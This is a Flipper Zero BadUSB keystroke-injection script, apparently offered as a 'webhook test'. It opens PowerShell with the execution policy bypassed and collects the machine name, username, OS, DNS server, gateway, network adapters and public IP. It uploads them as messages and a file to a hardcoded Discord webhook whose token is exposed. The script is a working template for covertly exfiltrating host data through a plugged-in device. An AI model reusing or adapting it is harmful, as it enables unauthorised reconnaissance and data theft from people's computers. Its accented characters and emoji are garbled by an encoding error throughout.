REM ================================================================
REM Flipper Zero BadUSB - Test Webhook Discord
REM ================================================================
REM Nom: Webhook Test
REM Description: Test simple de connectivit√© Discord webhook
REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
REM Auteur: Plume-Paopedia
REM Version: 1.0
REM Dur√©e: 1-2 minutes
REM Privil√®ges: Utilisateur standard
REM Objectif: Validation webhook + diagnostic r√©seau
REM ================================================================

DEFAULT_DELAY 200

REM Ouverture PowerShell rapide
GUI r
DELAY 400
STRING powershell -ExecutionPolicy Bypass
ENTER
DELAY 800

STRING try {
ENTER

STRING # Configuration webhook
ENTER
STRING $webhook = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
ENTER

STRING # Test de connectivit√© basique
ENTER
STRING Write-Host 'üß™ Test Webhook Discord - D√©but' -ForegroundColor Green
ENTER
STRING $testStart = Get-Date
ENTER

STRING # Information syst√®me
ENTER
STRING $computerName = $env:COMPUTERNAME
ENTER
STRING $userName = $env:USERNAME
ENTER
STRING $osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
ENTER
STRING $psVersion = $PSVersionTable.PSVersion.ToString()
ENTER

STRING # Test 1: Ping Discord
ENTER
STRING Write-Host '1Ô∏è‚É£ Test connectivit√© Discord...' -ForegroundColor Yellow
ENTER
STRING try {
ENTER
STRING   $ping = Test-NetConnection discord.com -Port 443 -ErrorAction SilentlyContinue
ENTER
STRING   $discordOK = $ping.TcpTestSucceeded
ENTER
STRING } catch {
ENTER
STRING   $discordOK = $false
ENTER
STRING }
ENTER

STRING if ($discordOK) {
ENTER
STRING   Write-Host '‚úÖ Connexion Discord OK' -ForegroundColor Green
ENTER
STRING } else {
ENTER
STRING   Write-Host '‚ùå Probl√®me connexion Discord' -ForegroundColor Red
ENTER
STRING }
ENTER

STRING # Test 2: Envoi message simple
ENTER
STRING Write-Host '2Ô∏è‚É£ Test envoi message...' -ForegroundColor Yellow
ENTER
STRING $testMessage = @{
ENTER
STRING   content = "üß™ **Test Webhook Flipper Zero**`n" +
ENTER
STRING             "üñ•Ô∏è **Machine:** $computerName`n" +
ENTER
STRING             "üë§ **Utilisateur:** $userName`n" +
ENTER
STRING             "üíª **OS:** $osVersion`n" +
ENTER
STRING             "‚ö° **PowerShell:** $psVersion`n" +
ENTER
STRING             "‚è∞ **Heure:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" +
ENTER
STRING             "üåê **Connectivit√© Discord:** $(if($discordOK){'‚úÖ OK'}else{'‚ùå √âchec'})"
ENTER
STRING }
ENTER

STRING try {
ENTER
STRING   $response = Invoke-RestMethod -Uri $webhook -Method Post -Body ($testMessage | ConvertTo-Json) -ContentType 'application/json'
ENTER
STRING   Write-Host '‚úÖ Message envoy√© avec succ√®s!' -ForegroundColor Green
ENTER
STRING   $webhookOK = $true
ENTER
STRING } catch {
ENTER
STRING   Write-Host "‚ùå Erreur envoi: $($_.Exception.Message)" -ForegroundColor Red
ENTER
STRING   $webhookOK = $false
ENTER
STRING }
ENTER

STRING Start-Sleep 2
ENTER

STRING # Test 3: Cr√©ation et envoi fichier test
ENTER
STRING Write-Host '3Ô∏è‚É£ Test envoi fichier...' -ForegroundColor Yellow
ENTER
STRING $testFile = "$env:TEMP\webhook_test_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
ENTER
STRING $fileContent = @"
RAPPORT TEST WEBHOOK FLIPPER ZERO
=================================
Date du test: $(Get-Date)
Machine: $computerName
Utilisateur: $userName
Syst√®me: $osVersion
PowerShell: $psVersion

R√âSULTATS DES TESTS:
‚Ä¢ Connectivit√© Discord: $(if($discordOK){'SUCC√àS'}else{'√âCHEC'})
‚Ä¢ Envoi message: $(if($webhookOK){'SUCC√àS'}else{'√âCHEC'})
‚Ä¢ Envoi fichier: EN COURS...

INFORMATIONS R√âSEAU:
‚Ä¢ DNS Primaire: $((Get-DnsClientServerAddress -Family IPv4 -AddressFamily IPv4)[0].ServerAddresses[0])
‚Ä¢ Passerelle: $((Get-NetRoute -DestinationPrefix 0.0.0.0/0)[0].NextHop)

CONFIGURATION SYST√àME:
‚Ä¢ Timezone: $((Get-TimeZone).DisplayName)
‚Ä¢ Culture: $((Get-Culture).DisplayName)
‚Ä¢ Architecture: $env:PROCESSOR_ARCHITECTURE

Ce fichier a √©t√© g√©n√©r√© automatiquement par le script de test webhook.
"@
ENTER

STRING $fileContent | Out-File -FilePath $testFile -Encoding UTF8
ENTER

STRING # Fonction d'envoi avec fichier
ENTER
STRING function Send-FileToDiscord {
ENTER
STRING   param($message, $filePath)
ENTER
STRING   try {
ENTER
STRING     $boundary = [System.Guid]::NewGuid().ToString()
ENTER
STRING     $headers = @{'Content-Type' = "multipart/form-data; boundary=$boundary"}
ENTER
STRING     $fileContent = [System.IO.File]::ReadAllBytes($filePath)
ENTER
STRING     $fileName = [System.IO.Path]::GetFileName($filePath)
ENTER
STRING     
ENTER
STRING     $body = "--$boundary`r`n"
ENTER
STRING     $body += "Content-Disposition: form-data; name=`"content`"`r`n`r`n$message`r`n"
ENTER
STRING     $body += "--$boundary`r`n"
ENTER
STRING     $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
ENTER
STRING     $body += "Content-Type: text/plain`r`n`r`n"
ENTER
STRING     
ENTER
STRING     $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
ENTER
STRING     $endBoundary = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
ENTER
STRING     $fullBody = $bodyBytes + $fileContent + $endBoundary
ENTER
STRING     
ENTER
STRING     Invoke-RestMethod -Uri $webhook -Method Post -Body $fullBody -Headers $headers
ENTER
STRING     return $true
ENTER
STRING   } catch {
ENTER
STRING     Write-Host "Erreur envoi fichier: $($_.Exception.Message)" -ForegroundColor Red
ENTER
STRING     return $false
ENTER
STRING   }
ENTER
STRING }
ENTER

STRING $fileMessage = "üìÑ **Rapport de test webhook** - Machine: $computerName"
ENTER
STRING $fileSent = Send-FileToDiscord $fileMessage $testFile
ENTER

STRING if ($fileSent) {
ENTER
STRING   Write-Host '‚úÖ Fichier envoy√© avec succ√®s!' -ForegroundColor Green
ENTER
STRING } else {
ENTER
STRING   Write-Host '‚ùå √âchec envoi fichier' -ForegroundColor Red
ENTER
STRING }
ENTER

STRING # Nettoyage
ENTER
STRING Remove-Item $testFile -Force -ErrorAction SilentlyContinue
ENTER

STRING # Test 4: Diagnostic r√©seau avanc√©
ENTER
STRING Write-Host '4Ô∏è‚É£ Diagnostic r√©seau...' -ForegroundColor Yellow
ENTER
STRING $networkInfo = @()
ENTER
STRING try {
ENTER
STRING   $adapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
ENTER
STRING   foreach ($adapter in $adapters) {
ENTER
STRING     $networkInfo += "‚Ä¢ $($adapter.Name): $($adapter.LinkSpeed)"
ENTER
STRING   }
ENTER
STRING } catch {
ENTER
STRING   $networkInfo += "‚Ä¢ Informations adapters non disponibles"
ENTER
STRING }
ENTER

STRING try {
ENTER
STRING   $publicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip" -TimeoutSec 5).Trim()
ENTER
STRING } catch {
ENTER
STRING   $publicIP = "Non d√©terminable"
ENTER
STRING }
ENTER

STRING # R√©sum√© final
ENTER
STRING $testDuration = (Get-Date) - $testStart
ENTER
STRING $finalReport = "üìã **R√©sum√© Test Webhook**`n`n"
ENTER
STRING $finalReport += "üñ•Ô∏è **Machine:** $computerName`n"
ENTER
STRING $finalReport += "üë§ **Utilisateur:** $userName`n"
ENTER
STRING $finalReport += "‚è±Ô∏è **Dur√©e:** $([math]::Round($testDuration.TotalSeconds,1))s`n`n"
ENTER
STRING $finalReport += "**R√©sultats:**`n"
ENTER
STRING $finalReport += "$(if($discordOK){'‚úÖ'}else{'‚ùå'}) Connectivit√© Discord`n"
ENTER
STRING $finalReport += "$(if($webhookOK){'‚úÖ'}else{'‚ùå'}) Envoi message`n"
ENTER
STRING $finalReport += "$(if($fileSent){'‚úÖ'}else{'‚ùå'}) Envoi fichier`n`n"
ENTER
STRING $finalReport += "üåê **IP Publique:** $publicIP`n"
ENTER
STRING $finalReport += "üîó **Adapteurs r√©seau:**`n"
ENTER
STRING foreach ($info in $networkInfo) { $finalReport += "$info`n" }
ENTER
STRING $finalReport += "`nüéØ **Statut global:** "
ENTER
STRING if ($discordOK -and $webhookOK -and $fileSent) {
ENTER
STRING   $finalReport += "**‚úÖ TOUS LES TESTS R√âUSSIS**`nLe webhook est op√©rationnel!"
ENTER
STRING } elseif ($webhookOK) {
ENTER
STRING   $finalReport += "**‚ö†Ô∏è PARTIELLEMENT FONCTIONNEL**`nMessages OK, v√©rifiez les fichiers"
ENTER
STRING } else {
ENTER
STRING   $finalReport += "**‚ùå PROBL√àME D√âTECT√â**`nV√©rifiez la connectivit√© et l'URL webhook"
ENTER
STRING }
ENTER

STRING # Envoi du rapport final
ENTER
STRING try {
ENTER
STRING   Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$finalReport} | ConvertTo-Json) -ContentType 'application/json'
ENTER
STRING   Write-Host 'üì§ Rapport final envoy√©!' -ForegroundColor Green
ENTER
STRING } catch {
ENTER
STRING   Write-Host '‚ùå Impossible d envoyer le rapport final' -ForegroundColor Red
ENTER
STRING }
ENTER

STRING # Affichage local du r√©sum√©
ENTER
STRING Write-Host "`n" -NoNewline
ENTER
STRING Write-Host '‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê' -ForegroundColor Blue
ENTER
STRING Write-Host '                    R√âSUM√â DU TEST WEBHOOK                  ' -ForegroundColor Blue  
ENTER
STRING Write-Host '‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê' -ForegroundColor Blue
ENTER
STRING Write-Host "Machine: $computerName | Utilisateur: $userName" -ForegroundColor White
ENTER
STRING Write-Host "Dur√©e: $([math]::Round($testDuration.TotalSeconds,1))s | IP: $publicIP" -ForegroundColor White
ENTER
STRING Write-Host ""
ENTER
STRING Write-Host "R√âSULTATS DES TESTS:" -ForegroundColor Yellow
ENTER
STRING Write-Host "‚Ä¢ Connectivit√© Discord: $(if($discordOK){'‚úÖ OK'}else{'‚ùå √âCHEC'})" -ForegroundColor $(if($discordOK){'Green'}else{'Red'})
ENTER
STRING Write-Host "‚Ä¢ Envoi message: $(if($webhookOK){'‚úÖ OK'}else{'‚ùå √âCHEC'})" -ForegroundColor $(if($webhookOK){'Green'}else{'Red'})  
ENTER
STRING Write-Host "‚Ä¢ Envoi fichier: $(if($fileSent){'‚úÖ OK'}else{'‚ùå √âCHEC'})" -ForegroundColor $(if($fileSent){'Green'}else{'Red'})
ENTER
STRING Write-Host ""
ENTER
STRING if ($discordOK -and $webhookOK -and $fileSent) {
ENTER
STRING   Write-Host 'üéâ WEBHOOK PLEINEMENT OP√âRATIONNEL!' -ForegroundColor Green
ENTER
STRING   Write-Host 'Tous les scripts avec Discord fonctionneront correctement.' -ForegroundColor Green
ENTER
STRING } elseif ($webhookOK) {
ENTER
STRING   Write-Host '‚ö†Ô∏è  WEBHOOK PARTIELLEMENT FONCTIONNEL' -ForegroundColor Yellow
ENTER
STRING   Write-Host 'Les messages fonctionnent, probl√®me possible avec les fichiers.' -ForegroundColor Yellow
ENTER
STRING } else {
ENTER
STRING   Write-Host '‚ùå WEBHOOK NON FONCTIONNEL' -ForegroundColor Red
ENTER
STRING   Write-Host 'V√©rifiez la connexion internet et l URL du webhook.' -ForegroundColor Red
ENTER
STRING }
ENTER
STRING Write-Host '‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê' -ForegroundColor Blue
ENTER

STRING } catch {
ENTER
STRING   $errorMsg = "üí• **ERREUR CRITIQUE TEST WEBHOOK**`nMachine: $env:COMPUTERNAME`nErreur: $($_.Exception.Message)"
ENTER
STRING   Write-Host $errorMsg -ForegroundColor Red
ENTER
STRING   try {
ENTER
STRING     Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$errorMsg}|ConvertTo-Json) -ContentType 'application/json'
ENTER
STRING   } catch { }
ENTER
STRING }
ENTER

STRING Write-Host "`nV√©rifiez votre canal Discord pour voir tous les messages de test."
ENTER
STRING Write-Host "Appuyez sur Entr√©e pour fermer..."
ENTER
STRING Read-Host
ENTER
STRING exit
ENTER